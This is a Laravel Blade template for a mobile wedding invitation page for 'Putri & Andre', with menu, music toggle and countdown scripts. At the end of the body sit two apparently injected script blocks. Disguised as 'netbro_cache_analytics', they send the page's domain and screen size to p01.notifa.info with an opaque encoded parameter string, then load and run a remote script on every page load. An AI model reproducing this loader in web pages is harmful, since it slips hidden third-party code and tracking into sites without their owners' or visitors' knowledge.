
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <meta property="og:image" content="{{ asset('/images/imagelink/13.jpg') }}"> 
    <meta property="og:title" content="Wedding of Putri & Andre" />
    <meta property="og:description" content="Gedung Pewayangan Kautaman, 17 | MARET | 2018.">
    <meta property="og:type" content="article" />   
    <meta property="og:url" content=""/>

    <link rel="shortcut icon" href="{{ asset('wedding-5/images/favicon.png') }}">
    <link href="{{ asset('wedding-5/images/apple_touch_icon_72x72.png') }}" media="(device-width: 320px)" rel="apple-touch-startup-image">
    <link href="{{ asset('wedding-5/images/apple_touch_icon_114x114.png') }}" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
    <title>Putri & Andre Wedding - by halalindong.com</title>
    <link rel="stylesheet" href="{{ asset('wedding-5/css/framework7.css') }}">
    <link rel="stylesheet" href="{{ asset('wedding-5/css/style.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('wedding-5/css/swipebox.css') }}" />
    <link type="text/css" rel="stylesheet" href="{{ asset('wedding-5/css/animations.css') }}" />
    <link type="text/css" rel="stylesheet" href="{{ asset('wedding-5/css/custom.css') }}" />    
    <link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="{{asset('css/animate.css')}}">
    <link rel="stylesheet" href="{{asset('css/magnific-popup.css')}}">
</head>
<body id="mobile_wrap">
    <div class="statusbar-overlay"></div>
    <div class="panel-overlay"></div>
    <div class="panel panel-left panel-reveal">
        <div class="view view-subnav">
            <div class="pages">
                <div data-page="panel-leftmenu" class="page pagepanel" style="background-color: #414141;">	
                    <div class="page-content">
                        <nav class="main-nav icons_21">
                            <ul >  
                                <li>
                                    <a href="" onclick="pindahMenu('index')"  class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/home.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Home</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="" onclick="pindahMenu('couple')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/rings.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Mempelai</span>
                                    </a>
                                </li>
                            
                                <li>
                                    <a href="" onclick="pindahMenu('event')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/blog.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Acara</span>
                                    </a>
                                </li>  
                                <li>
                                    <a href="" onclick="pindahMenu('gallery')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/photos.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Galeri</span>
                                    </a>
                                </li>			
                                <li>
                                    <a href="" onclick="pindahMenu('map')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/map.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Lokasi</span>
                                    </a>
                                </li>
                            
                                <li>
                                    <a href="" onclick="pindahMenu('quotes')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/quotes.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Quotes</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="" onclick="pindahMenu('says')" class="close-panel" data-view=".view-main">
                                        <img src="{{ asset('images/icons/gold/message.png') }}" alt="" title="" />
                                        <span class="leftmenu_name">Ucapan</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#" class="close-panel" data-view=".view-main">
                                        <img src="" alt="" title="" />
                                        <span class="leftmenu_name"></span>
                                    </a>
                                </li>
                            </ul>
    			        </nav>
                    </div>
  		        </div>
  	        </div>
	    </div>  
    </div>
    <div class="views"  >
        <div class="view view-main">
            <div class="pages" id="content">
                @include('wedding-5.home')
                @include('wedding-5.couple')
                @include('wedding-5.event')
                @include('wedding-5.map')
                @include('wedding-5.quotes')
                @include('wedding-5.says')
                @include('wedding-5.gallery')
                @include('wedding-5.video')
            </div>
        </div>
    </div>

<div class="music-box">
    <button class="music-box-toggle-btn">
        <audio id='song' loop>
          <source src="http://wd.halalindong.com/assets/templates/mobile/music/andra_love_can_save_it_all.mp3">
        </audio>  

        <button type="button" class="music" id="mute-sound" >
          <i class="fa fa-music"></i>
        </button>
        <button type="button" class="music" id="unmute-sound" >
          <i class="fa fa-microphone-slash"></i>
        </button> 
    </button>
</div>


<script type="text/javascript" src="{{ asset('wedding-3/js/jquery-1.10.1.min.js') }}"></script>
<script type="text/javascript" src="{{asset('js/jquery.magnific-popup.min.js')}}"></script>

<script>
	document.getElementById('mute-sound').style.display = 'none';
    document.getElementById('unmute-sound').addEventListener('click', function(event){
    document.getElementById('unmute-sound').style.display = 'none';
    document.getElementById('mute-sound').style.display = 'inline-block';
    document.getElementById('song').play();
  });

    document.getElementById('mute-sound').addEventListener('click', function(event){
    document.getElementById('mute-sound').style.display = 'none';
    document.getElementById('unmute-sound').style.display = 'inline-block';
    document.getElementById('song').pause();
  });


</script>
    
  <script type="text/javascript" src="{{ asset('wedding-5/js/jquery.validate.min.js') }}" ></script>
  <script type="text/javascript" src="{{ asset('wedding-5/js/framework7.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-5/js/jquery.swipebox.js') }}"></script> 
  <script type="text/javascript" src="{{ asset('wedding-5/js/jquery.fitvids.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-5/js/email.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-5/js/audio.min.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-5/js/my-app.js') }}"></script>

  <script>
function pindahMenu(tujuan) {
    var active = $('#content').find('.active').attr('id');
    var tujuan = tujuan;
    console.log(tujuan);
    $("#" + active).removeClass('animated flip active');
    $("#" + active).addClass('hidden');
    $("#" + tujuan).removeClass('hidden');
    $("#" + tujuan).addClass('animated flip active');
}
</script>


<script>
    function makeTimer() {

      var endTime = new Date("");     
      var endTime = (Date.parse(endTime)) / 1000;

      var now = new Date();
      var now = (Date.parse(now) / 1000);

      var timeLeft = endTime - now;

      var days = Math.floor(timeLeft / 86400); 
      var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
      var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600 )) / 60);
      var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));

      if (hours < "10") { hours = "0" + hours; }
      if (minutes < "10") { minutes = "0" + minutes; }
      if (seconds < "10") { seconds = "0" + seconds; }

      $("#days").html(days + "<span>Days</span>");
      $("#hours").html(hours + "<span>Hours</span>");
      $("#minutes").html(minutes + "<span>Minutes</span>");
      $("#seconds").html(seconds + "<span>Seconds</span>");   
  }

  setInterval(function() { makeTimer(); }, 1000);
</script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4AsOAl%2bDG5ffILjqNGoqiZVBqv%2fMysxuzQRe7na8BzbBrzyi4cs%2bEtSkZvtYNGqW3l%2fBFx8lPBRyVkzL3TtdL1LxuC4cx1ZtCTi7SqtZ6e3oZaNkhBpw8B2nIehV8qoudrqgGZlGEPMKEjFVlaw7TGr917IS2oYE8tqNMczZa4i5xdwukFAphfdNEx6JL5eF5UsYIAa2jb5VPokTwcxN4ny%2fC7rg9pNLkdXNG4An%2fwO3coC5DK8Cf3hTiP4bovu5J7kqqybEBN7mITtBQvNKeTjfSffFGLdlSjZs8xQAQsWEW1QgTvKULE4eWVmhvf97nkW5wTIkqCctgGPC0uR47NImFmCf%2bWVpbh90RZ0%2fq6vwbTcmegr1%2fnhFX7kXRM1htyhHLPiqccSVHdtasvh%2bBwMkUvK1wQ8OWmfiIsV%2bik1NBabMxSu8YbUaYtGVsVpI4fW1OdTHuyc0jasAWLpkJj8%2bY03ocrw%2fedT53bsI30RMm4LRGnLUBQNcgMwHpwUMvdTRAE8QUnuzTrtO2GK5GkChOlcvKkuX9NXQptu77dpQ8zXzUTI0LQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2GL9VkzwiM1F9DyydHIlQEflQ0XvdimWJiOFxzgvDLSSEO4pT4jLEX5TlbgvsFuV0BFb2SAOai1uO5WiaKj0bIE%2bEPUzeNO%2fQZ8GflFdgsY%2f5lcuGbyEeKEim3sdrg850vJ3XCT%2fhh%2bY%2bmM1ssyf5NTNTG0t6c5a9FR5GmDQIMad3kOgxeKUOp3JH78wyrLANFOw7xWW0H%2btjF2vvuhN9d%2bNpTBJMsJElu2%2fGRp5nQRNYtA6xCvxmDnGOofuZG3YbbM9ZsqNyin9RWjCFnNpsykuSdg6mSg3tXxiS4WGyVaCjuToJj%2bMJiyvJNx9hsO1QvnPQlgKlQYoi%2ftyicTGmJ%2bC4F557Q1%2bz4PEBDg%2fZGywLqIT42A0KVT1Nt6UtVou5r6pqgo5wLdvEItqO7PtDm4gIL%2fgk3gl8YNh9XpdhAJmJQ8DLaWdPuTj1I%2bfAoP3rjcTNyLVgUkIe%2fgG2ROksIhhyYTjZBgcGAY63kS1ypg21LiacjvFKsA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>